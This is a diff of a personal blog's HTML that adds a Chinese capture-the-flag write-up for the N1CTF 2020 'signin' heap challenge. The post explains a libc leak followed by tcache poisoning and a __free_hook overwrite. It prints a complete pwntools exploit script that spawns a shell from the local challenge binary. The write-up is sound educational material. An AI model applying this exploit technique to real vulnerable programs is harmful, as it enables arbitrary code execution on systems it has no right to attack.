@@ -6,16 +6,21 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Tag: 2020极客大挑战 | 辰祈w</title>
+  <title>signin | 辰祈w</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta property="og:type" content="website">
-<meta property="og:title" content="辰祈w">
-<meta property="og:url" content="http://yoursite.com/tags/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/index.html">
+  <meta name="description" content="signin考点：heap难度：***这个题目其实不难，就是通过free来移动指针的位置来泄露出libc，再改写tcache的指针，然后改写free_hook,打比赛的时候想复杂了…… 竟然直接去tcache里面去改，难怪一直跑不出来……">
+<meta property="og:type" content="article">
+<meta property="og:title" content="signin">
+<meta property="og:url" content="http://yoursite.com/2020/10/20/signin/index.html">
 <meta property="og:site_name" content="辰祈w">
+<meta property="og:description" content="signin考点：heap难度：***这个题目其实不难，就是通过free来移动指针的位置来泄露出libc，再改写tcache的指针，然后改写free_hook,打比赛的时候想复杂了…… 竟然直接去tcache里面去改，难怪一直跑不出来……">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-10-20T08:03:18.513Z">
+<meta property="article:modified_time" content="2020-10-21T02:35:19.969Z">
 <meta property="article:author" content="Chenqiw">
+<meta property="article:tag" content="N1CTF 2020">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="辰祈w" type="application/atom+xml">
@@ -183,238 +188,252 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-signin" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2020/10/19/runcode/" class="archive-article-date">
-        <time datetime="2020-10-19T12:28:08.140Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-19</time>
-</a>
-
-        </div>
-    	 
+      <header class="article-header">
   
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2020/10/19/runcode/" target="_blank">runcode</a>
   
+    <h1 class="article-title" itemprop="name">
+      signin
     </h1>
   
 
 
-        <div class="article-info info-on-right">
+  
+  
+        
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
+<a href="/2020/10/20/signin/" class="archive-article-date">
+        <time datetime="2020-10-20T08:03:18.513Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-20</time>
+</a>
+
+  
+  
+    
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">373字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">1分</span>
+    </span>
+  </span>
+</div>
+
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h1><h5 id="考点：heap"><a href="#考点：heap" class="headerlink" title="考点：heap"></a>考点：heap</h5><h5 id="难度："><a href="#难度：" class="headerlink" title="难度：***"></a>难度：***</h5><p>这个题目其实不难，就是通过free来移动指针的位置来泄露出libc，再改写tcache的指针，然后改写free_hook,打比赛的时候想复杂了…… 竟然直接去tcache里面去改，难怪一直跑不出来…… </p>
+<a id="more"></a>
+
+<p>查看ida发现是c++的题，额有点自闭，先进去看看</p>
+<p>一共三个功能</p>
+<pre><code>switch ( v3 )
+{
+  case 2:
+    free();
+    break;
+  case 3:
+    show();
+    break;
+  case 1:
+    add();
+    break;
+}</code></pre><p>free可以前移指针，不受限制。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sub_1364</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">8</span>) -= <span class="number">8L</span>L;</span><br><span class="line">  sub_17A6(a1, *(_QWORD *)(a1 + <span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>show打印指针指向的内容 </p>
+<p>add 填充一个数据 </p>
+<p>往第一个vector里面写入很多数据就会扩充vector把vector以前的指针给free掉</p>
+<p>所以 只要添加的数据多自然会有一个chunk 放进unsorted bin</p>
+<p>然后 将指针后移 到 这个块的fd或者bk再show就是libc了 </p>
+<p>泄露出libc后直接改tcache的指针，用2的vector 打free_hook</p>
+<p>exp</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(log_level = "debug")</span></span><br><span class="line">p = process(<span class="string">"./signin"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,num)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt;&gt;"</span>,<span class="string">"1"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">"Number:"</span>,str(num))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt;&gt;"</span>,<span class="string">"2"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt;&gt;"</span>,<span class="string">"3"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">257</span>):</span><br><span class="line">	<span class="keyword">print</span> i,</span><br><span class="line">	add(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">514</span>):</span><br><span class="line">	<span class="keyword">print</span> i,</span><br><span class="line">	free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = int(p.recv(<span class="number">15</span>))<span class="number">-0x3ebca0</span></span><br><span class="line">success(hex(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc.sym[<span class="string">'__free_hook'</span>]+libc_base</span><br><span class="line">system = libc_base+libc.sym[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">269</span>):</span><br><span class="line">	<span class="keyword">print</span> i,</span><br><span class="line">	free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> hex(free_hook)</span><br><span class="line"><span class="comment"># gdb.attach(s,'b *$rebase(0x11e0)\nc')</span></span><br><span class="line">add(<span class="number">1</span>,free_hook<span class="number">-0x8</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">2</span>,u64(<span class="string">"/bin/sh\x00"</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,system)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    
+
+    
+
+    
+    <div class="declare"> 
+      <ul class="post-copyright">
+        <li>
+          <strong>本文作者：</strong>
+          Chenqiw
+        </li>
+        <li>
+          <strong>本文链接：</strong>
+          <a href="http://yoursite.com/2020/10/20/signin/" title="signin" target="_blank">http://yoursite.com/2020/10/20/signin/</a>
+        </li>
+        
+        <li>
+          <strong>版权声明： </strong>
           
+          本博客所有文章除特别声明外，均采用 <a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/blob/master/LICENSE" rel="external nofollow" target="_blank">MIT</a> 许可协议。转载请注明出处！
+        </li>
+        
+      </ul>
+    </div>
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">2020极客大挑战</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">N1CTF 2020</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+    
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/基础//" class="article-tag-list-link color3">基础</a>
+        			<a href="/categories/tcache-heap//" class="article-tag-list-link color2">tcache heap</a>
         		</li>
       		
 		</ul>
 	</div>
 
 
+    
+
+    
+    
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <!-- <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a> -->
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/10/20/signin/" alt="微信分享二维码"> -->
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+
+    
+    <div class="clearfix"></div>
+  </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2020/10/19/fmt/" class="archive-article-date">
-        <time datetime="2020-10-19T12:15:58.162Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-19</time>
-</a>
 
+
+<nav id="article-nav">
+  
+    <a href="/2020/10/21/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          2020极客大挑战
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/03/24/%E5%B0%81%E9%9D%A2%E9%9B%86/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">封面集</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2020/10/19/fmt/" target="_blank">fmt</a>
-  
-    </h1>
-  
+        
+        
+    </div>
+</aside>
 
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">2020极客大挑战</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/格式化字符串//" class="article-tag-list-link color2">格式化字符串</a>
-        		</li>
-      		
-		</ul>
-	</div>
 
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2020/10/19/liuzhuang-secret/" class="archive-article-date">
-        <time datetime="2020-10-19T11:50:58.976Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-19</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2020/10/19/liuzhuang-secret/" target="_blank">liuzhuang-secret</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">2020极客大挑战</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/栈溢出//" class="article-tag-list-link color4">栈溢出</a>
-        		</li>
-      		
-		</ul>
-	</div>
 
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2020/10/19/%E6%95%B0%E5%AD%97%E5%92%8B%E6%A0%B7/" class="archive-article-date">
-        <time datetime="2020-10-19T11:30:13.260Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-19</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2020/10/19/%E6%95%B0%E5%AD%97%E5%92%8B%E6%A0%B7/" target="_blank">数字咋样</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">2020极客大挑战</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/基础//" class="article-tag-list-link color3">基础</a>
-        		</li>
-      		
-		</ul>
-	</div>
 
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -455,9 +474,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: true,
 		toc_hide_index: true,
@@ -547,7 +566,11 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">2020极客大挑战</a>
+                <a href="javascript:void(0)" class="js-tag color3">比赛</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">N1CTF 2020</a>
               </li>
              
               <li class="article-tag-list-item">
